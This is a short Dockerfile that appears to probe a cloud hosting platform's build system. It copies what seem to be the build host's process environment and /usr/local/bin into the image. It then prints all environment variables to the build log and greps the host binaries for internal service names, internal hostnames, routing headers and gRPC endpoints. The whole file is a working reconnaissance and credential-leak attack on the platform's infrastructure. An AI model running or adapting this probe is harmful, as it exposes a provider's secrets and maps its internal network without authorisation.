FROM alpine:3.20
COPY proc/self/environ /f/se
COPY usr/local/bin /f/ulb
RUN sh -c 'set +e; echo "===R4==="; echo --ENV--; tr "\0" "\n" < /f/se | sort; echo --ULB_LS--; ls -la /f/ulb 2>&1 | head -80; for f in /f/ulb/*; do [ -f "$f" ] || continue; sz=$(wc -c < "$f" 2>/dev/null); echo "== BIN $f size=$sz"; head -c 160 "$f" | tr -c "[:print:]\n" "."; echo; if [ "$sz" -lt 120000000 ]; then echo "-- internal_ --"; grep -aoE "internal_[A-Za-z0-9_.-]{2,48}" "$f" 2>/dev/null | sort -u | head -80; echo "-- mpipe --"; grep -aoE "x-mpipe-target[^\"]{0,60}|RAILWAY_MPIPE[A-Z_]{0,20}|mpipe[._-]?[A-Za-z]{0,24}" "$f" 2>/dev/null | sort -u | head -30; echo "-- hosts --"; grep -aoE "[A-Za-z0-9_-]{3,44}\.(rlwy\.net|railway\.app|railway\.internal|railway\.com)" "$f" 2>/dev/null | sort -u | head -30; echo "-- names --"; grep -aoE "(orchestrator|backboard|registry|network-cp|storage-agent|stacklet|certs|railyard|station|nats|builder|temporal|otel)[A-Za-z0-9_./:-]{0,30}" "$f" 2>/dev/null | sort -u | head -120; echo "-- grpc --"; grep -aoE "/[A-Za-z0-9_.]+/[A-Za-z0-9_]{2,40}" "$f" 2>/dev/null | grep -vE "^/[a-z]+/|/tmp/|/etc/|/proc/|/usr/|/var/|/dev/|/sys/" | sort -u | head -60; fi; done; echo "===R4_END==="'
CMD ["sh","-c","sleep 10"]
